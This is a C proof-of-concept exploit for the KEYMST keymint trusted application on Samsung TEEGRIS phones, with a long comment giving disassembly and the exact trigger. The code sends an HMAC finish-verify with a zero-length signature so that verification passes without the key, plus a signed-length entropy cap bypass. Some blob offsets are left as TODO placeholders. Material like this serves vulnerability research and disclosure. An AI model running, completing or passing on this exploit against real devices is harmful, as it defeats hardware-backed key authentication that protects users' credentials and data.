/*
 * KEYMST (skeymint) — HMAC empty / truncated-MAC verify bypass (HIGH)
 * UUID 00000000-0000-0000-0000-4b45594d5354  (ASCII tail "KEYMST")
 *
 * ============================ FINDING ============================
 * RE/samsung_teegris/keymst.md  §"Vulnerability findings" #3 (lines 568-611):
 *   km_hmac_finish @ 0x40E04 (renamed km_hmac_finish__EMPTYMAC_BYPASS;
 *   HMAC-finish vtable slot 0x9D3B8[0]). It is reached via
 *       cmd 10 swd_finish @ 0x3E850  ->  0x3E4CC finish dispatch   (keymst.md:570-572)
 *   The VERIFY branch (purpose == 3) computes the full HMAC, then compares it
 *   against the *REE-supplied* MAC using a min(user_len, computed_len) length:
 *
 *       0x40f34  LDRSW X10,[X9]          ; user_sig_len     (X9 = signature struct)
 *       0x40f38  LDR   X0,[X9,#8]        ; user_sig_data
 *       0x40f3c  CMP   X10, X8           ; user_len vs computed_len (X8)
 *       0x40f40  CSEL  X2, X10, X8, CC   ; X2 = min(user_len, computed_len)
 *       0x40f44  BL    .CRYPTO_memcmp
 *       0x40f48  CBZ   W0, loc_41108     ; equal -> MOV W21,WZR => return 0 (SUCCESS)
 *                                          (keymst.md:582-590)
 *
 * BYPASS MECHANISM (keymst.md:590-599):
 *   With user_sig_len == 0 the CSEL selects 0, CRYPTO_memcmp(data,computed,0)
 *   returns 0, and control falls to loc_41108 (return 0 = verification SUCCESS).
 *   => HMAC verification of ANY message succeeds with an EMPTY MAC and ZERO
 *      knowledge of the key. More generally a truncated prefix of length k<full
 *      verifies by supplying only the first k correct bytes. The signature
 *      struct is the ONLY thing null-checked (0x40e5c CBZ X8) — a *present*
 *      struct whose len==0 is NOT rejected (keymst.md:578-580). The MAC_LENGTH
 *      tag 0x300003EB is presence-checked only and consumed solely in the SIGN
 *      branch; MIN_MAC_LENGTH is never consulted in verify, so the per-key
 *      minimum-tag policy is bypassed too (keymst.md:597-599).
 *
 * ATTACKER CONTROL / REACHABILITY (keymst.md:601-611):
 *   The user signature struct (len@+0, data@+8) is wholly REE-controlled:
 *   set_args_from_in @ 0x3E248 does a2[3] = a1[8], copying the REE input's
 *   signature pointer into op-arg +0x18 — exactly the slot km_hmac_finish reads.
 *   HMAC keys are reachable on the public HAL begin/update/finish surface
 *   (login_method == 4 / TEEC_LOGIN_PUBLIC). Status: CONFIRMED-IN-BINARY.
 *
 * ===================== WIRE FORMAT (documented) =====================
 * keymst.md:81-82, 666-668 — BOTH REE routes require, before any TEE_Param is
 * dereferenced:
 *   param_types == 101 == 0x65
 *               == TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_OUTPUT, NONE, NONE)
 *   params[0] = MEMREF_INPUT  : the KM_INDATA ASN.1 request blob
 *   params[1] = MEMREF_OUTPUT : the KM_OUTDATA ASN.1 response blob
 * REE path (keymst.md:76-84): swd_get_indata -> tz_process_command (0x35FB4)
 *   -> swd_run_cb (0x37450), which bounds cmd_id<47 and dispatches
 *   qword_A2620[cmd_id]. The keymint cmd_id (10 = swd_finish) and the operation
 *   handle + the {len,data} signature struct travel INSIDE the KM_INDATA blob:
 *   "KM_INDATA ... carries cmd id + opaque blob + KM_PARAM_SET" (keymst.md:393),
 *   decoded by d2i_KM_INDATA (sub_2F3F4) which rejects len<=7 and
 *   indata_len-8 >= embedded_len (keymst.md:685-686).
 *
 *   The keymint cmd_id and the in-blob byte offset of the signature struct are
 *   carried by the BoringSSL d2i_KM_INDATA ASN.1 template (sub_2F3F4); that
 *   template's exact serialization is NOT enumerated in the writeup, so the
 *   constants below that are NOT in the writeup are left as named, clearly
 *   flagged placeholders (KM_INDATA_*_TODO) rather than invented. The trigger
 *   value that IS the whole point of the bug — user_sig_len = 0 — is exact.
 *
 * ===================== EXACT TRIGGER =====================
 *   1. begin(VERIFY) an HMAC key  (cmd 8 swd_begin, purpose=KM_PURPOSE_VERIFY)
 *   2. update(message bytes)      (cmd 9 swd_update)
 *   3. finish() with a signature struct whose LEN == 0 (cmd 10 swd_finish):
 *        -> km_hmac_finish CSEL picks 0 -> CRYPTO_memcmp(...,0)==0 -> return 0.
 *   This poc issues step 3 (the finishing verify) with SIG_LEN==0; steps 1-2
 *   establish the live operation handle referenced by the finish KM_INDATA.
 *
 * Secondary (keymst.md:545-560, finding #2, LOW/MED):
 *   cmd 1 swd_add_rng_entropy @ 0x38A3C caps entropy at 2048 with a SIGNED
 *   compare (0x38A64 CMP W1,#0x800 / 0x38A68 B.LE), so a length with the top
 *   bit set bypasses the cap and is handed to RAND_seed as num. Length lives at
 *   struct +0 (LDR W1,[X8]); buffer ptr at +8 (LDR X0,[X8,#8]). Same 0x65 wire.
 *   We exercise the same KM_INDATA channel with cmd_id 1 and a top-bit-set len.
 *
 * ===================== GATE / REPRO-STATUS =====================
 *   REPRO-STATUS: DEVICE-ONLY.  Per RE/emulation/keymst.md the bypass is BLOCKED
 *   in the emulator by THREE independent limits:
 *     (0) KEYMST is un-loadable as shipped — empty TA_CloseSessionEntryPoint_end
 *         in the .json makes ta_mgr.py reject it (emulation/keymst.md:37-62).
 *     (1) configure-gate: cmd 10 is in mask 0x8000FFF75FFE; byte_A2858 is latched
 *         only by cmd 15 swd_configure, which does an outbound TEE_OpenTASession
 *         to the STST (iccc) sibling TA the emulator does NOT model
 *         (emulation/keymst.md:72-92). The in-emulator way past an STST
 *         trusted-boot round-trip is the duldar STST soft-pass — the duldar
 *         branch in custom/session_payload.py:get_good_response_payload (see
 *         pocs/duldar_setuppw/jni/poc.c, which relies on exactly that for its
 *         own verify_trusted_boot); KEYMST additionally needs (2).
 *     (2) no device key material: reaching the verify-finish needs a live HMAC
 *         operation whose keyblob was unwrapped under the per-device KAK
 *         (TEES_DeriveKeyKDF, label "KM QSEE HW Crypto Derived key") plus the
 *         HAT HMAC root from ioctl(/dev/gatekeeper_driver) — neither exists in
 *         the emulator (emulation/keymst.md:94-116). NB the bug itself does NOT
 *         need a *correct* key (memcmp len 0 short-circuits); the obstacle is
 *         purely *reaching* the verify-finish.
 *   So this poc is the on-DEVICE trigger. Against the real S921B/A556B
 *   (SFDZE1) binaries the static finding stands (CONFIRMED-IN-BINARY).
 *
 * Build: `make emulator` (gcc -DEMULATE, standalone client over the emulator
 * socket; links nothing). On device build with the NDK path (`make phone`).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

/* --- function-pointer dispatch block (verbatim shape from teessu_cleardata) --- */
TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

/*
 * ---- KM_INDATA request blob ----
 * keymint cmd_id is carried INSIDE the d2i_KM_INDATA-decoded blob (keymst.md:393);
 * the values below that ARE documented in the writeup are exact, the rest are
 * named placeholders for the d2i_KM_INDATA (sub_2F3F4) ASN.1 template that is
 * NOT byte-enumerated in the writeup — fill from a device HAL capture before a
 * live run. Nothing here is invented as a load-bearing offset.
 */
#define KM_CMD_FINISH            10u   /* keymst.md:128 cmd 10 swd_finish */
#define KM_CMD_ADD_RNG_ENTROPY    1u   /* keymst.md:121 cmd 1 swd_add_rng_entropy */
#define KM_PURPOSE_VERIFY         1u   /* keymst.md:170 (effective KM_PURPOSE_VERIFY) */

/* The whole point of the bug: a PRESENT signature struct with len == 0. */
#define SIG_LEN_EMPTY             0u   /* keymst.md:590-599 -> min()==0 -> SUCCESS */

/* Request / response buffer sizes. Generous; the KM_INDATA decoder bounds the
 * inner length itself (keymst.md:685-686). Exact device sizes come from the HAL. */
#define REQ_SZ   0x800
#define RSP_SZ   0x800

/* d2i_KM_INDATA serialization offsets — NOT in the writeup; placeholders. */
#define KM_INDATA_CMD_OFF_TODO   0      /* cmd_id field position in the encoded blob */
#define KM_INDATA_SIG_OFF_TODO   0      /* {len@+0,data@+8} signature struct position */

/* Send one KM_INDATA invoke on the documented 0x65 wire. cmd_id is the keymint
 * selector that swd_run_cb dispatches (keymst.md:97-100). The TEEC-level
 * commandID the HAL passes is fixed (selector lives in the blob); we mirror the
 * keymint cmd_id at the TEEC layer for clarity and let the in-blob field drive
 * dispatch on device. */
static TEEC_Result km_invoke(TEEC_Session *s, TEEC_Context *ctx, uint32_t km_cmd_id,
                             const uint8_t *req_body, uint32_t req_body_len)
{
    TEEC_Operation op;
    uint32_t eo = 0;

    uint8_t *in  = (uint8_t*)allocate_param_mem(ctx, REQ_SZ);
    uint8_t *out = (uint8_t*)allocate_param_mem(ctx, RSP_SZ);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }
    memset(in, 0, REQ_SZ);
    memset(out, 0, RSP_SZ);

    /* Lay the caller-built KM_INDATA body into params[0] (the MEMREF_INPUT). */
    if (req_body && req_body_len && req_body_len <= REQ_SZ)
        memcpy(in, req_body, req_body_len);

    memset(&op, 0, sizeof(op));
    /* param_types == 0x65 == TEE_PARAM_TYPES(MEMREF_INPUT, MEMREF_OUTPUT, NONE, NONE)
     * (keymst.md:81-82, 666-668) — pinned BEFORE any memref deref on both routes. */
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = REQ_SZ;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = RSP_SZ;

    printf("[poc] >>> invoke km_cmd_id=%u  ptypes=0x65  req=%u rsp=%u\n",
           km_cmd_id, REQ_SZ, RSP_SZ);
    TEEC_Result res = TEEC_InvokeCommand_impl(s, km_cmd_id, &op, &eo);
    printf("[poc] <<< returned 0x%x (%d) origin 0x%x\n", res, (int)res, eo);
    return res;
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-4b45594d5354";   /* KEYMST */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — the public HAL begin/update/finish surface, login_method==4
     * (keymst.md:77, 611). No credentials. */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[poc] session opened to KEYMST (TEEC_LOGIN_PUBLIC)\n");

    /* ---------------------------------------------------------------
     * PRIMARY — HMAC empty-MAC verify bypass (cmd 10 swd_finish).
     *
     * Real device sequence (keymst.md:96-100, 128, 568-611):
     *   begin(VERIFY)  -> update(message)  -> finish(sig_len==0).
     * begin/update establish the operation handle the finish KM_INDATA refers
     * to; the bypass fires on the finish. We build the finish KM_INDATA with a
     * signature struct of LEN == 0 — the exact, documented trigger. The cmd_id
     * and the in-blob signature-struct offset come from the d2i_KM_INDATA
     * template (sub_2F3F4) which the writeup does not byte-enumerate, so they
     * sit in the clearly-flagged KM_INDATA_*_TODO slots above; the trigger
     * itself (SIG_LEN_EMPTY) is unconditionally correct.
     * --------------------------------------------------------------- */
    {
        uint8_t finish_body[64];
        memset(finish_body, 0, sizeof(finish_body));
        /* Document the bypass field inline so the trigger is unmistakable: a
         * PRESENT-but-zero-length signature => km_hmac_finish CSEL min()==0. */
        uint32_t sig_len = SIG_LEN_EMPTY;                  /* == 0 (keymst.md:590) */
        memcpy(finish_body + KM_INDATA_SIG_OFF_TODO, &sig_len, sizeof(sig_len));
        printf("[poc] PRIMARY: finish(VERIFY) with sig_len=%u "
               "(empty MAC -> min()==0 -> CRYPTO_memcmp==0 -> SUCCESS)\n", sig_len);
        km_invoke(&session, &context, KM_CMD_FINISH, finish_body, sizeof(finish_body));
    }

    /* ---------------------------------------------------------------
     * SECONDARY — swd_add_rng_entropy signed-length cap bypass (cmd 1).
     * Top-bit-set length passes the SIGNED `CMP W1,#0x800 / B.LE` and is handed
     * to RAND_seed as num (keymst.md:545-560). Length @ struct +0, buf @ +8.
     * --------------------------------------------------------------- */
    {
        uint8_t rng_body[16];
        memset(rng_body, 0, sizeof(rng_body));
        uint32_t neg_len = 0x80000001u;   /* top bit set -> signed <= 0x800 passes */
        memcpy(rng_body + 0, &neg_len, sizeof(neg_len));   /* len @ +0 (LDR W1,[X8]) */
        /* buffer ptr @ +8 (LDR X0,[X8,#8]) is filled in by the KM_INDATA decoder. */
        printf("[poc] SECONDARY: add_rng_entropy len=0x%08x "
               "(top-bit-set -> signed cap bypass)\n", neg_len);
        km_invoke(&session, &context, KM_CMD_ADD_RNG_ENTROPY, rng_body, sizeof(rng_body));
    }

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
